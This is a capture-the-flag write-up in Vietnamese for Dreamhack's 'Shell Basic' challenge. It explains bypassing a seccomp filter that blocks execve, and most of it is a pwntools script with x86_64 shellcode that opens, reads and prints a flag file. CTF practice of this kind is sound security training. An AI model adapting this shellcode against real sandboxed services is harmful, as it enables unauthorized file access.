# CHALLENGE: Shell Basic

## Vấn đề
- Chỉ cần viết shellcode đọc flag ở /home/shell_basic/flag_name_is_loooooong là xong.

## Giải pháp
- Sau khi dùng seccomp kiểm tra xem những lệnh nào có thể thực hiện thì thấy không thể sử dụng execve và execveat, nhưng còn lại có thể dùng được.
- Do đó, viết shellcode đẩy đường dẫn vào và dùng read, open, write để lấy flag.

## Script
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('shell_basic', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 23812)
else:
    p = process([exe.path])
GDB()

shellcode = asm(
    '''
    xor rax, rax
    push rax

    mov rax, 7453016957746376559
    push rax
    mov rax, 7809087175292972385
    push rax
    mov rax, 7953189135087710051
    push rax
    mov rax, 7598524071439789157
    push rax
    mov rax, 7526411514940450863
    push rax

    mov rax, 0x2
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 0x0
    syscall

    mov rdi, 0x1
    mov rdx, rax
    mov rax, 0x1
    syscall
    ''', arch='x86_64'
    )
s(shellcode)
p.interactive()

```
